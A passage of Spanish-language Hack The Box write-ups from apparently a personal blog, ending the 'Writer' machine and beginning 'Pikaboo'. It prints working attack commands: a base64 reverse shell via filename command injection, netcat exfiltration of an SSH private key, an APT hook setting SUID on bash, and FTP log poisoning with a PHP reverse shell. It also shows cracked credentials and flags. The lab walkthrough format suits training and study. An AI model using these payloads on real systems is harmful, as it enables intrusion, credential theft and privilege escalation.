IPC$ NO ACCESS IPC Service (writer server (Samba, Ubuntu)) Como kyle, podemos leer y escribir archivos en writer2_project. Descarguemos todos los ficheros:\n$ smbclient -U kyle //10.10.11.101/writer2_project Enter WORKGROUP\\kyle\u0026#39;s password: Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; dir  . D 0 Mon Aug 2 19:46:12 2021  .. D 0 Tue Jun 22 13:55:06 2021  static D 0 Sun May 16 16:29:16 2021  staticfiles D 0 Fri Jul 9 06:59:42 2021  writer_web D 0 Wed May 19 11:26:18 2021  requirements.txt N 15 Mon Aug 2 19:46:01 2021  writerv2 D 0 Wed May 19 08:32:41 2021  manage.py N 806 Mon Aug 2 19:46:01 2021  7151096 blocks of size 1024. 1985880 blocks available smb: \\\u0026gt; recurse ON smb: \\\u0026gt; prompt OFF smb: \\\u0026gt; mget * ... Una vez descargados, vemos que se trata de un proyecto de Django (otro framework web hecho en Python). Parece que el proyecto está sin terminar, pero es suficiente para encontrar otras credenciales de MySQL.\nLa contraseña se obtiene en el archivo writer2_project/writer2/settings.py, como se muestra en el siguiente fragmento de código:\n# Database # https://docs.djangoproject.com/en/1.10/ref/settings/#databases  DATABASES = {  \u0026#39;default\u0026#39;: {  \u0026#39;ENGINE\u0026#39;: \u0026#39;django.db.backends.mysql\u0026#39;,  \u0026#39;OPTIONS\u0026#39;: {  \u0026#39;read_default_file\u0026#39;: \u0026#39;/etc/mysql/my.cnf\u0026#39;  }  } } Entonces podemos mirar el archivo /etc/mysql/my.cnf utilizando la vulnerabilidad de SQLi:\n$ python sqli.py /etc/mysql/my.cnf # The MariaDB configuration file # # The MariaDB/MySQL tools read configuration files in the following order: # 1. \u0026#34;/etc/mysql/mariadb.cnf\u0026#34; (this file) to set global defaults, # 2. \u0026#34;/etc/mysql/conf.d/*.cnf\u0026#34; to set global options. # 3. \u0026#34;/etc/mysql/mariadb.conf.d/*.cnf\u0026#34; to set MariaDB-only options. # 4. \u0026#34;~/.my.cnf\u0026#34; to set user-specific options. # # If the same option is defined multiple times, the last one will apply. # # One can use all long options that the program supports. # Run program with --help to get a list of available options and with # --print-defaults to see which it would actually understand and use.  # # This group is read both both by the client and the server # use it for options that affect everything # [client-server]  # Import all .cnf files from configuration directory !includedir /etc/mysql/conf.d/ !includedir /etc/mysql/mariadb.conf.d/  [client] database = dev user = djangouser password = DjangoSuperPassword default-character-set = utf8 Y tenemos más credenciales para MySQL: djangouser:DjangoSuperPassword.\nIntrusión en la máquina En el panel de administración, podemos controlar todo el blog (crear artículos, editarlos e incluso borrarlos):\nEl formulario utilizado para crear un nuevo artículo es el siguiente:\nExisten dos maneras de subir una imagen para el artículo: como archivo o como URL.\nLa diferencia entre las dos últimas capturas es la caja de texto de imagen, la diferencia es muy sutil.\nPara obtener acceso a la máquina, podemos volver a leer el __init__.py. El script hace algo raro al recibir las imágenes en las siguientes líneas:\nif request.method == \u0026#34;POST\u0026#34;:  if request.files[\u0026#39;image\u0026#39;]:  image = request.files[\u0026#39;image\u0026#39;]  if \u0026#34;.jpg\u0026#34; in image.filename:  path = os.path.join(\u0026#39;/var/www/writer.htb/writer/static/img/\u0026#39;, image.filename)  image.save(path)  image = \u0026#34;/img/{}\u0026#34;.format(image.filename)  else:  error = \u0026#34;File extensions must be in .jpg!\u0026#34;  return render_template(\u0026#39;add.html\u0026#39;, error=error)  if request.form.get(\u0026#39;image_url\u0026#39;):  image_url = request.form.get(\u0026#39;image_url\u0026#39;)  if \u0026#34;.jpg\u0026#34; in image_url:  try:  local_filename, headers = urllib.request.urlretrieve(image_url)  os.system(\u0026#34;mv {}{}.jpg\u0026#34;.format(local_filename, local_filename))  image = \u0026#34;{}.jpg\u0026#34;.format(local_filename)  try:  im = Image.open(image)  im.verify()  im.close()  image = image.replace(\u0026#39;/tmp/\u0026#39;,\u0026#39;\u0026#39;)  os.system(\u0026#34;mv /tmp/{}/var/www/writer.htb/writer/static/img/{}\u0026#34;.format(image, image))  image = \u0026#34;/img/{}\u0026#34;.format(image)  except PIL.UnidentifiedImageError:  os.system(\u0026#34;rm {}\u0026#34;.format(image))  error = \u0026#34;Not a valid image file!\u0026#34;  return render_template(\u0026#39;add.html\u0026#39;, error=error)  except:  error = \u0026#34;Issue uploading picture\u0026#34;  return render_template(\u0026#39;add.html\u0026#39;, error=error)  else:  error = \u0026#34;File extensions must be in .jpg!\u0026#34;  return render_template(\u0026#39;add.html\u0026#39;, error=error) Estas líneas aparecen tanto en /dashboard/stories/add como en /dashboard/stories/edit/\u0026lt;id\u0026gt;. Como se dijo previamente, hay dos maneras de subir una imagen. Una subiéndola directamente como archivo y otra indicando la URL donde se localiza la imagen.\nLa documentación de urllib.requests.urlretrieve() dice lo siguiente:\n retrieve(url, filename=None, reporthook=None, data=None): Retrieves the contents of url and places it in filename. The return value is a tuple consisting of a local filename [\u0026hellip;]. If filename is not given and the URL refers to a local file, the input filename is returned. If the URL is non-local and filename is not given, the filename is the output of tempfile.mktemp() with a suffix that matches the suffix of the last path component of the input URL. [\u0026hellip;].\n Esto significa que si la URL apunta a un archivo local, el nombre del archivo será el mismo que el que se pide por la URL. Pero si el archivo se obtiene del exterior, entonces se elige un nombre aleatorio.\nLa vulnerabilidad está en la llamada a os.system con una entrada de usuario peculiar. La idea es subir un archivo cuyo nombre sea image.jpg x;shell-command, para no romper el comando mv, que necesita dos parámetros, y ejecutar así el comando que queremos. El comando resultante será así:\nmv image.jpg x;shell-command; image.jpg x;shell-command;.jpg La extensión .jpg no será un problema porque el servidor solamente verifica que la cadena \u0026quot;.jpg\u0026quot; está incluida en el nombre del archivo:\nimage_url = request.form.get(\u0026#39;image_url\u0026#39;) if \u0026#34;.jpg\u0026#34; in image_url:  # ... Después, tenemos que intentar subir otra imagen, pero esta vez mediante URL (utilizando el esquema file://), de manera que el archivo se toma de la propia máquina y el nombre del archivo no se cambie. Será entonces cuando el comando inyectado se ejecutará en la llamada a os.system.\nGeneramos el comando malicioso como una reverse shell codificada en Base64:\n$ echo -n \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.17.44/4444 0\u0026gt;\u0026amp;1\u0026#39; | base64 YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx Luego, creamos el archivo fdsa.jpg x;echo \u0026lt;b64\u0026gt;|base64 -d|bash; y lo subimos como fichero.\nDespués, lo volvemos a subir con la siguiente URL: file:///var/www/writer.htb/writer/static/img/fdsa.jpg x;echo \u0026lt;b64\u0026gt;|base64 -d|bash;. El uso de file:// es necesario para que la URL apunte a un archivo local.\nUtilizando nc, obtenemos acceso a la máquina como www-data.\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.101. Ncat: Connection from 10.10.11.101:36806. bash: cannot set terminal process group (1055): Inappropriate ioctl for device bash: no job control in this shell www-data@writer:/$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@writer:/$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444  reset xterm www-data@writer:/$ export TERM=xterm www-data@writer:/$ export SHELL=bash www-data@writer:/$ stty rows 50 columns 158 Todo el proceso de intrusión se encuentra automatizado en un script en Python llamado foothold.py (explicación detallada aquí).\nEnumeración del sistema Ahora podemos recordar que teníamos otras credenciales de MySQL (djangouser:DjangoSuperPassword). Y de hecho, con estas podemos encontrar otro hash de contraseña:\nwww-data@writer:/var/www/writer2_project$ mysql -u djangouser -p Enter password: ... MariaDB [dev]\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | dev | | information_schema | +--------------------+ 2 rows in set (0.000 sec) MariaDB [dev]\u0026gt; use dev; Database changed MariaDB [dev]\u0026gt; show tables; +----------------------------+ | Tables_in_dev | +----------------------------+ | auth_group | | auth_group_permissions | | auth_permission | | auth_user | | auth_user_groups | | auth_user_user_permissions | | django_admin_log | | django_content_type | | django_migrations | | django_session | +----------------------------+ 10 rows in set (0.001 sec) MariaDB [dev]\u0026gt; describe auth_user; +--------------+--------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +--------------+--------------+------+-----+---------+----------------+ | id | int(11) | NO | PRI | NULL | auto_increment | | password | varchar(128) | NO | | NULL | | | last_login | datetime(6) | YES | | NULL | | | is_superuser | tinyint(1) | NO | | NULL | | | username | varchar(150) | NO | UNI | NULL | | | first_name | varchar(150) | NO | | NULL | | | last_name | varchar(150) | NO | | NULL | | | email | varchar(254) | NO | | NULL | | | is_staff | tinyint(1) | NO | | NULL | | | is_active | tinyint(1) | NO | | NULL | | | date_joined | datetime(6) | NO | | NULL | | +--------------+--------------+------+-----+---------+----------------+ 11 rows in set (0.002 sec) MariaDB [dev]\u0026gt; select username, password from auth_user; +----------+------------------------------------------------------------------------------------------+ | username | password | +----------+------------------------------------------------------------------------------------------+ | kyle | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | +----------+------------------------------------------------------------------------------------------+ 1 row in set (0.001 sec) Esta vez el hash se rompe usando hashcat, y se obtiene la contraseña del usuario kyle (marcoantonio):\n$ hashcat --example-hashes | grep -C 2 pbkdf2_sha256 MODE: 10000 TYPE: Django (PBKDF2-SHA256) HASH: pbkdf2_sha256$10000$1135411628$bFYX62rfJobJ07VwrUMXfuffLfj2RDM2G6/BrTrUWkE= PASS: hashcat $ hashcat -m 10000 hash /usr/share/wordlists/rockyou.txt --quiet pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio Movimiento lateral al usuario john Ahora podemos acceder como kyle por SSH. Y tenemos a flag de user.txt:\n$ ssh kyle@10.10.11.101 kyle@10.10.11.101\u0026#39;s password: kyle@writer:~$ cat user.txt 2f1aa903cb62c07380d1d452ef397cf1 Podemos darnos cuenta de que kyle pertenece al grupo filter. Como miembro de este grupo, podemos leer y escribir en un script llamado /etc/postfix/disclaimer:\nkyle@writer:~$ id uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup) kyle@writer:~$ find / -group filter 2\u0026gt;/dev/null /etc/postfix/disclaimer /var/spool/filter kyle@writer:~$ find / -group filter 2\u0026gt;/dev/null | xargs ls -la -rwxrwxr-x 1 root filter 1021 Aug 25 23:56 /etc/postfix/disclaimer /var/spool/filter: total 8 drwxr-x--- 2 filter filter 4096 May 13 22:31 . drwxr-xr-x 7 root root 4096 May 18 16:54 .. Este script /etc/postfix/disclaimer es el siguiente:\n#!/bin/sh # Localize these. INSPECT_DIR=/var/spool/filter SENDMAIL=/usr/sbin/sendmail  # Get disclaimer addresses DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses  # Exit codes from \u0026lt;sysexits.h\u0026gt; EX_TEMPFAIL=75 EX_UNAVAILABLE=69  # Clean up when done or when aborting. trap \u0026#34;rm -f in.$$\u0026#34; 0 1 2 3 15  # Start processing. cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit $EX_TEMPFAIL; }  cat \u0026gt;in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }  # obtain From address from_address=`grep -m 1 \u0026#34;From:\u0026#34; in.$$ | cut -d \u0026#34;\u0026lt;\u0026#34; -f 2 | cut -d \u0026#34;\u0026gt;\u0026#34; -f 1`  if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then  /usr/bin/altermime --input=in.$$ \\  --disclaimer=/etc/postfix/disclaimer.txt \\  --disclaimer-html=/etc/postfix/disclaimer.txt \\  --xheader=\u0026#34;X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm\u0026#34; || \\  { echo Message content rejected; exit $EX_UNAVAILABLE; } fi  $SENDMAIL \u0026#34;$@\u0026#34; \u0026lt;in.$$  exit $? Lo que hace el script es añadir un texto de aviso legal (disclaimer) a todos los correos enviados desde root@writer.htb o kyle@writer.htb, como se muestra a continuación:\nkyle@writer:~$ cat /etc/postfix/disclaimer_addresses root@writer.htb kyle@writer.htb kyle@writer:~$ cat /etc/postfix/disclaimer.txt -- This email and any files transmitted with it are confidential and intended solely for the use of the individual or entity to whom they are addressed. If you have received this email in error please notify the system manager. This message contains confidential information and is intended only for the individual named. If you are not the named addressee you should not disseminate, distribute or copy this e-mail. Please notify the sender immediately by e-mail if you have received this e-mail by mistake and delete this e-mail from your system. If you are not the intended recipient you are notified that disclosing, copying, distributing or taking any action in reliance on the contents of this information is strictly prohibited. Writer.HTB Entonces podemos deducir que el script se ejecuta cada vez que se envía un correo mediante SMTP. Además, podemos modificar el script porque estamos en el grupo filter.\nDespués de notar que john tiene un directorio .ssh, podemos simplemente transferir su clave privada a nuestra máquina de atacante poniendo el comando nc 10.10.17.44 4444 \u0026lt; /home/john/.ssh/id_rsa en el archivo /etc/postfix/disclaimer.\nPara que el script se ejecute, es necesario enviar un correo. Para ello, podemos utilizar un simple script de Python como el siguiente (encontrado aquí):\n#!/usr/bin/python3  import smtplib  sender = \u0026#39;kyle@writer.htb\u0026#39; receivers = [\u0026#39;john@writer.htb\u0026#39;]  message = \u0026#39;\u0026#39;\u0026#39; From: Kyle \u0026lt;kyle@writer.htb\u0026gt; To: John \u0026lt;john@writer.htb\u0026gt; Subject: SMTP e-mail test This is a test e-mail message. \u0026#39;\u0026#39;\u0026#39;[1:]  try:  smtp_object = smtplib.SMTP(\u0026#39;localhost\u0026#39;)  smtp_object.sendmail(sender, receivers, message)  print(\u0026#39;Successfully sent email\u0026#39;) except smtplib.SMTPException:  print(\u0026#39;Error: unable to send email\u0026#39;) Y obtenemos la clave privada de john. Con esto conseguimos acceso por ssh:\n$ nc -nlvp 4444 \u0026gt; id_rsa Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.101. Ncat: Connection from 10.10.11.101:38630. ^C $ chmod 600 id_rsa $ ssh -i id_rsa john@10.10.11.101 john@writer:~$ Escalada de privilegios Si listamos procesos con ps, vemos que existe una tarea Cron ejecutada como root que realiza un apt-get update:\njohn@writer:~$ ps -faux | grep root ... root 31467 0.0 0.0 8356 3400 ? S 19:52 0:00 _ /usr/sbin/CRON -f root 31475 0.0 0.0 2608 608 ? Ss 19:52 0:00 _ /bin/sh -c /usr/bin/apt-get update root 31479 0.1 0.2 16204 8524 ? S 19:52 0:00 _ /usr/bin/apt-get update ... De nuevo, podemos ver si pertenecemos a algún grupo, y vemos que somos parte del grupo management, cuyos miembros pueden escribir en /etc/apt/apt.conf.d:\njohn@writer:~$ id uid=1001(john) gid=1001(john) groups=1001(john),1003(management) john@writer:~$ find / -group management 2\u0026gt;/dev/null /etc/apt/apt.conf.d john@writer:~$ cd /etc/apt/apt.conf.d john@writer:~$ cat /etc/apt/apt.conf.d/* | grep APT:: APT::Periodic::Update-Package-Lists \u0026#34;1\u0026#34;; APT::Periodic::Download-Upgradeable-Packages \u0026#34;0\u0026#34;; APT::Periodic::AutocleanInterval \u0026#34;0\u0026#34;; APT::Update::Post-Invoke-Success {\u0026#34;touch /var/lib/apt/periodic/update-success-stamp 2\u0026gt;/dev/null || true\u0026#34;;}; APT::Archives::MaxAge \u0026#34;30\u0026#34;; APT::Archives::MinAge \u0026#34;2\u0026#34;; APT::Archives::MaxSize \u0026#34;500\u0026#34;; APT::Update::Post-Invoke-Success { APT::Update::Post-Invoke-Success { APT::Update::Post-Invoke-Success {\u0026#34;/usr/lib/update-notifier/update-motd-updates-available 2\u0026gt;/dev/null || true\u0026#34;;}; Después de ver los archivos que hay en el directorio y buscando apt-get en GTFObins, podemos poner un comando para que se ejecute antes de apt-get update. Por ejemplo, podemos darle permisos SUID a /bin/bash:\njohn@writer:~$ ls -l /bin/bash -rwxr-xr-x 1 root root 1183448 Jun 18 2020 /bin/bash john@writer:~$ echo \u0026#39;APT::Update::Pre-Invoke {\u0026#34;chmod 4755 /bin/bash\u0026#34;;};\u0026#39; \u0026gt; /etc/apt/apt.conf.d/01asdf Y después de un minuto aproximadamente tenemos acceso como root:\njohn@writer:~$ ls -l /bin/bash -rwsr-xr-x 1 root root 1183448 Jun 18 2020 /bin/bash john@writer:~$ bash -p bash-5.0# chmod 0755 /bin/bash bash-5.0# cat /root/root.txt f7e5f21393414b3bb227ee32fdae67a ","image":"/images/HTB/Writer/Writer.png","permalink":"https://7rocky.github.io/htb/writer/","section":"htb","summary":"Hack The Box. Linux. Máquina media. Esta máquina contiene una página web vulnerable a inyección de código SQL. Esto permite leer el código fuente del servidor y encontrar una vulnerabilidad. Después, se utilizan varias técnicas de inyección de comandos para escalar privilegios. Para comprometer la máquina, se necesita programar una explotación automática de SQLi y conocimientos de SMB, SMTP y tareas Cron. En este write-up se utilizan scripts en Python personalizados para SQLi y para la intrusión","time":15,"title":"Writer"},{"contents":"  SO: Linux   Dificultad: Difícil   Dirección IP: 10.10.10.249   Fecha: 17 / 07 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.10.249 -p 21,22,80 Nmap scan report for 10.10.10.249 Host is up (0.045s latency).  PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA) | 256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA) |_ 256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519) 80/tcp open http nginx 1.14.2 |_http-server-header: nginx/1.14.2 |_http-title: Pikaboo Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 10.16 seconds La máquina tiene abiertos los puertos 21 (FTP), 22 (SSH) y 80 (HTTP).\nEnumeración web Si entramos a http://10.10.10.249, veremos la siguiente página web:\nPodemos ver también una \u0026ldquo;Pokatdex\u0026rdquo;:\nParece que existe un panel de administración, pero no podemos entrar porque no tenemos credenciales (al acceder a /admin, nos solicita credentiales mediante HTTP Basic Authentication):\nUtilizando gobuster, podemos listar algunas rutas del servidor web y ver algo extraño:\n$ gobuster dir -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -q -r -u http://10.10.10.249 /images (Status: 403) [Size: 274] /admin (Status: 401) [Size: 456] /administration (Status: 401) [Size: 456] /administrator (Status: 401) [Size: 456] /administr8 (Status: 401) [Size: 456] /administrative (Status: 401) [Size: 456] /administratie (Status: 401) [Size: 456] /admins (Status: 401) [Size: 456] /admin_images (Status: 401) [Size: 456] /administrivia (Status: 401) [Size: 456] /administrative-law (Status: 401) [Size: 456] /administrators (Status: 401) [Size: 456] /admin1 (Status: 401) [Size: 456] /administer (Status: 401) [Size: 456] /admin3_gtpointup (Status: 401) [Size: 456] /admin_hp (Status: 401) [Size: 456] /admin25 (Status: 401) [Size: 456] /admin02 (Status: 401) [Size: 456] /administrationinfo (Status: 401) [Size: 456] /admin_thumb (Status: 401) [Size: 456] /admin_full (Status: 401) [Size: 456] /admin_functions (Status: 401) [Size: 456] /admin2 (Status: 401) [Size: 456] /adminhelp (Status: 401) [Size: 456] /adminoffice (Status: 401) [Size: 456] /administracja (Status: 401) [Size: 456] Como se puede observar, el servidor está solicitando autenticación cuando la URL comienza por /admin:\n$ curl http://10.10.10.249/adminasdf \u0026lt;!DOCTYPE HTML PUBLIC \u0026#34;-//IETF//DTD HTML 2.0//EN\u0026#34;\u0026gt; \u0026lt;html\u0026gt;\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;401 Unauthorized\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt;\u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Unauthorized\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;This server could not verify that you are authorized to access the document requested. Either you supplied the wrong credentials (e.g., bad password), or your browser doesn\u0026#39;t understand how to supply the credentials required.\u0026lt;/p\u0026gt; \u0026lt;hr\u0026gt; \u0026lt;address\u0026gt;Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 81\u0026lt;/address\u0026gt; \u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt; Además, vemos que la respuesta del servidor es de Apache/2.4.38 en el puerto 81. La salida de nmap inicial mostraba que el servidor web en el puerto 80 es nginx.\nLas imágenes que hay en la página web son servidas por nginx. Esto se puede ver mirando la respuesta de error del servidor:\nRealizando una navegación de directorios Es posible que existan malas configuraciones entre estos servidores web, y probablemente estén relacionadas con la ruta /admin. Podemos aplicar fuzzing para encontrar una navegación de directorios (Directory Path Traversal), y vemos lo siguiente:\n$ ffuf -u \u0026#39;http://10.10.10.249/admin../FUZZ\u0026#39; -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt admin [Status: 401, Size: 456, Words: 42, Lines: 15] javascript [Status: 301, Size: 314, Words: 20, Lines: 10]  [Status: 403, Size: 274, Words: 20, Lines: 10] server-status [Status: 200, Size: 5815, Words: 269, Lines: 114] Se puede ver que es posible navegar entre directorios. Sin embargo, no tenemos permiso para acceder a /admin../admin porque no tenemos credenciales.\nPodemos comprobar si hay más directorios que empiezen por admin. Por ejemplo:\n$ ffuf -u \u0026#39;http://10.10.10.249/admin../adminFUZZ\u0026#39; -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt  [Status: 401, Size: 456, Words: 42, Lines: 15] $ ffuf -u \u0026#39;http://10.10.10.249/admin../admin_FUZZ\u0026#39; -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt staging [Status: 301, Size: 317, Words: 20, Lines: 10] Y obtenemos que existe un directorio llamado admin_staging, y además es accesible.\nAhora podemos entrar en http://10.10.10.249/admin../admin_staging/ y saltarnos la autenticación:\nEncontrando un LFI Si inspeccionamos la página, vemos que el servidor está incluyendo archivos PHP mediante un parámetro GET, como se muestra:\nPodemos aplicar fuzzing con ffuf para buscar archivos disponibles:\n$ ffuf -u \u0026#39;http://10.10.10.249/admin../admin_staging/index.php?page=FUZZ.php\u0026#39; -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -fw 3272 info [Status: 200, Size: 86990, Words: 6716, Lines: 1170] user [Status: 200, Size: 24978, Words: 7266, Lines: 578] index [Status: 200, Size: 0, Words: 1, Lines: 1] dashboard [Status: 200, Size: 40555, Words: 15297, Lines: 883] tables [Status: 200, Size: 29131, Words: 11707, Lines: 744] typography [Status: 200, Size: 24923, Words: 6989, Lines: 567] Al descargar estos archivos, podemos notar que el código se está interpretando. Esto es un signo de que la página es vulnerable a inclusión de archivos locales (LFI).\nPara poder leer el código fuente de los archivos PHP, podemos utilizar un wrapper PHP (por ejemplo, codificar el contenido en Base64 y decodificarlo después). Se puede probar con admin_staging/index.php:\nSi cogemos este archivo codificado en Base64 y lo decodificamos, veremos que hay un fragmento de código PHP que muestra cómo se realiza la inclusión de archivos:\n\u0026lt;?php  if (isset($_GET[\u0026#39;page\u0026#39;])) {  include($_GET[\u0026#39;page\u0026#39;]);  } else {  include(\u0026#39;dashboard.php\u0026#39;);  } ?\u0026gt;Sin embargo, el servidor solamente permite incluir algunos archivos (aparte de los archivos PHP vistos anteriormente). Esto se muestra en el archivo admin_staging/info.php, que es un phpinfo(), y se indica que solamente se pueden incluir archivos del directorio /var/ del servidor.\nEnvenenamiento del log de FTP Teniendo en cuenta que hay un servidor FTP, la idea es realizar un envenenamiento del archivo de log de FTP. Este archivo (/var/log/vsftpd.log) es legible:\nLa técnica consiste en insertar código PHP en el archivo de log, de manera que al ser incluido en la página web, el código PHP se ejecuta.\nMirando al archivo de log de FTP, vemos que el nombre de usuario se refleja, por lo que será en este campo donde habrá que incluir el código PHP para obtener ejecución remota de comandos (RCE).\nA continuación, podemos utilizar un comando de sistema para obtener una reverse shell desde la máquina (es necesario escribir algo en la contraseña para que funcione):\n$ ftp 10.10.10.249 Connected to 10.10.10.249. 220 (vsFTPd 3.0.3) Name (10.10.10.249:rocky): \u0026lt;?php system(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.17.44/4444 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); ?\u0026gt; 331 Please specify the password. Password: 530 Login incorrect. ftp: Login failed. ftp\u0026gt; quit 221 Goodbye. Ahora que el log de FTP está envenenado, podemos ejecutarlo utilizando el LFI. Desde nc, obtenemos acceso a la máquina:\n$ curl \u0026#39;http://10.10.10.249/admin../admin_staging/index.php?page=/var/log/vsftpd.log\u0026#39; $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.249. Ncat: Connection from 10.10.10.249:60272. bash: cannot set terminal process group (664): Inappropriate ioctl for device bash: no job control in this shell www-data@pikaboo:/var/www/html/admin_staging$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@pikaboo:/var/www/html/admin_staging$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444  reset xterm www-data@pikaboo:/var/www/html/admin_staging$ export TERM=xterm www-data@pikaboo:/var/www/html/admin_staging$ export SHELL=bash www-data@pikaboo:/var/www/html/admin_staging$ stty rows 50 columns 158 Enumeración del sistema En este punto, podemos leer la flag user.txt como usuario www-data, aunque está en el directorio personal de pwnmeow:\nwww-data@pikaboo:/var/www/html/admin_staging$ ls -l /home total 560 drwxr-xr-x 2 pwnmeow pwnmeow 569344 Jul 6 20:02 pwnmeow www-data@pikaboo:/var/www/html/admin_staging$ ls -la /home/pwnmeow/ total 580 drwxr-xr-x 2 pwnmeow pwnmeow 569344 Jul 6 20:02 . drwxr-xr-x 3 root root 4096 May 10 10:26 .. lrwxrwxrwx 1 root root 9 Jul 6 20:02 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 pwnmeow pwnmeow 220 May 10 10:26 .bash_logout -rw-r--r-- 1 pwnmeow pwnmeow 3526 May 10 10:26 .bashrc -rw-r--r-- 1 pwnmeow pwnmeow 807 May 10 10:26 .profile lrwxrwxrwx 1 root root 9 Jul 6 20:01 .python_history -\u0026gt; /dev/null -r--r----- 1 pwnmeow www-data 33 Aug 29 22:20 user.txt www-data@pikaboo:/var/www/html/admin_staging$ cat /home/pwnmeow/user.txt f3417b113fe715a58e02f9e29fe6c736 Ahora podemos enumerar puertos internos y descubrir que el puerto 389 (LDAP) está abierto:\nwww-data@pikaboo:/var/www/html/admin_staging$ cd / www-data@pikaboo:/$ for i in $(seq 1 65535); do timeout 1 echo 2\u0026gt;/dev/null \u0026gt; /dev/tcp/127.0.0.1/$i \u0026amp;\u0026amp; echo \u0026#34;Port $i open\u0026#34;; done Port 21 open Port 22 open Port 80 open Port 81 open Port 389 open Una manera más sencilla de enuumerar puertos internos abiertos es con netstat:\nwww-data@pikaboo:/$ netstat -nat Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:81 0.0.0.0:* LISTEN tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN tcp 0 0 127.0.0.1:389 0.0.0.0:* LISTEN tcp 1 0 127.0.0.1:81 127.0.0.1:49896 CLOSE_WAIT tcp 0 0 10.10.10.249:53456 10.10.16.113:4444 ESTABLISHED tcp 0 0 10.10.10.249:51604 10.10.15.128:4444 CLOSE_WAIT tcp 0 138 10.10.10.249:60272 10.10.17.44:4444 ESTABLISHED tcp 0 0 10.10.10.249:59558 10.10.14.29:1234 CLOSE_WAIT tcp 0 0 10.10.10.249:33250 10.10.14.217:4242 ESTABLISHED tcp6 0 0 :::80 :::* LISTEN tcp6 0 0 :::21 :::* LISTEN tcp6 0 0 :::22 :::* LISTEN Vemos también que hay algunos archivos de Python en /opt/pokeapi:\nwww-data@pikaboo:/$ ls -la /opt total 12 drwxr-xr-x 3 root root 4096 May 20 07:17 . drwxr-xr-x 18 root root 4096 Jul 27 09:32 .. drwxr-xr-x 10 root root 4096 Jul 6 18:58 pokeapi www-data@pikaboo:/$ ls -la /opt/pokeapi/ total 104 drwxr-xr-x 10 root root 4096 Jul 6 18:58 . drwxr-xr-x 3 root root 4096 May 20 07:17 .. drwxr-xr-x 2 root root 4096 May 19 12:04 .circleci -rw-r--r-- 1 root root 253 Jul 6 20:17 .dockerignore drwxr-xr-x 9 root root 4096 May 19 12:04 .git drwxr-xr-x 4 root root 4096 May 19 12:04 .github -rwxr-xr-x 1 root root 135 Jul 6 20:16 .gitignore -rw-r--r-- 1 root root 100 Jul 6 20:16 .gitmodules -rw-r--r-- 1 root root 3224 Jul 6 20:17 CODE_OF_CONDUCT.md -rw-r--r-- 1 root root 3857 Jul 6 20:17 CONTRIBUTING.md -rwxr-xr-x 1 root root 184 Jul 6 20:17 CONTRIBUTORS.txt -rw-r--r-- 1 root root 1621 Jul 6 20:16 LICENSE.md -rwxr-xr-x 1 root root 3548 Jul 6 20:16 Makefile -rwxr-xr-x 1 root root 7720 Jul 6 20:17 README.md drwxr-xr-x 6 root root 4096 May 19 12:04 Resources -rw-r--r-- 1 root root 0 Jul 6 20:16 __init__.py -rw-r--r-- 1 root root 201 Jul 6 20:17 apollo.config.js drwxr-xr-x 3 root root 4096 Jul 6 20:16 config drwxr-xr-x 4 root root 4096 May 